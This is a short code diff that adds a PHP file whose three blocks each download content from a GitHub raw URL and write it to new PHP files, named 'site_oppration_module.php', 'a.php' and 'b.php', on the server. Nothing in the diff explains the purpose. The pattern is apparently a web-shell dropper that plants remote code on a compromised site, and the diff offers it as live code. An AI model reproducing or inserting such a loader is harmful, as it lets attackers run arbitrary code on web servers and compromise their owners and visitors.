@@ -1,0 +1,15 @@
+ <?php $nama= fopen("site_oppration_module.php" ,"w+");
+  $file = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/404');
+  $tulis = fwrite ($nama ,$file);
+ fclose($nama); ?>
+ 
+ <?php $nama1= fopen("a.php" ,"w+");
+  $file1 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/gps');
+  $tulis1 = fwrite ($nama1 ,$file1);
+ fclose($nama1); ?>
+ 
+ <?php $nama2= fopen("b.php" ,"w+");
+  $file2 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/razia');
+  $tulis2 = fwrite ($nama2 ,$file2);
+ fclose($nama2); ?>
+ 
